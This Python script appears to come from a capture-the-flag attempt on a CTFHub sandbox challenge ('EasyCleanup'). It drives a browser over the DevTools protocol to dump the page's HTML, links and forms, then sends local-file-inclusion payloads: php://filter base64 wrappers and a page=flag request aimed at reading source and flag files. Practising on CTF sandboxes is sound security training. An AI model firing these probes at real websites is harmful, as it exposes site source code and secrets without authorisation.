#!/usr/bin/env python3
"""Explore EasyCleanup target via CDP."""
import sys, json, time, io, socket
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.path.insert(0, 'D:/ai')
from tools.feeder.spa_crawler import SpaCrawler

c = SpaCrawler()
c.connect('ctfhub')

target = 'http://challenge-c295913eebc950ce.sandbox.ctfhub.com:10800'

# Navigate to target
c._send('Page.navigate', {'url': target})
time.sleep(3)
while c._recv_any(0.3):
    pass

# Get page content
html = c.evaluate('document.documentElement.outerHTML')
print('=== PAGE HTML ===')
print(html[:5000] if html else 'None')

# Get all links
links = c.evaluate(
    'var as=document.querySelectorAll("a");'
    'var r=[];'
    'for(var i=0;i<as.length;i++){r.push(as[i].href+" | "+as[i].textContent.trim());}'
    'JSON.stringify(r)'
)
print(f'\n=== LINKS ===')
print(links)

# Check for forms
forms = c.evaluate(
    'var fs=document.querySelectorAll("form");'
    'var r=[];'
    'for(var i=0;i<fs.length;i++){r.push(fs[i].outerHTML.substring(0,500));}'
    'JSON.stringify(r)'
)
print(f'\n=== FORMS ===')
print(forms)

# Try common LFI paths
test_urls = [
    f'{target}/index.php?page=php://filter/convert.base64-encode/resource=index',
    f'{target}/index.php?page=flag',
    f'{target}/index.php?file=php://filter/convert.base64-encode/resource=flag',
    f'{target}/index.php?page=php://filter/read=convert.base64-encode/resource=flag.php',
]
for url in test_urls:
    print(f'\n--- Testing: {url.split("?")[1] if "?" in url else url} ---')
    c._send('Page.navigate', {'url': url})
    time.sleep(2)
    while c._recv_any(0.3):
        pass
    body = c.evaluate('document.body ? document.body.textContent.substring(0, 2000) : "empty"')
    print(f'Response: {body[:500] if body else "None"}')
